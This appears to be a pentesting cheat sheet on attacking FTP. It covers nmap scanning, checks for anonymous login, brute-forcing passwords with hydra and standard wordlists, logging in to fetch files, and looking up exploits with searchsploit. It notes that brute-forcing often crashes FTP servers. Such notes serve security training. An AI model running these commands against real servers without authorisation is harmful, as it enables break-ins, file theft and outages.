FTP runs on port 21 and frequently used as means of transferring files to and from the directiory of a web server.

FTP auth requires a user/pass. As a result, we can perform a brute-force attack on the FTP server in order to identify legit creds

In some cases, FTP servers may be configured to allow anonymous access, which consequently allows anyone to access the FTP server without providing any legit creds.

-----------------------------Exploitation--------------------------------------

nmap -sV <ip>

ftp <ip> (check for anonymous access and just enter / enter on user/pass prompt)

ls -al /usr/share/nmap/scripts/ | grep ftp-*
** you can also test for anonymous access with nmap scripts, this command shows you your options**

hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <IP> -t 4 ftp
**-t sets the threads you want to use, brute-forcing typically takes down FTP servers**
ftp <IP>
sysadmin (or any other valuable looking account)
dir (lists directory)
get secret.txt

**you can also use searchsploit to look for the specific version of FTP exploits**
searchsploit proftp
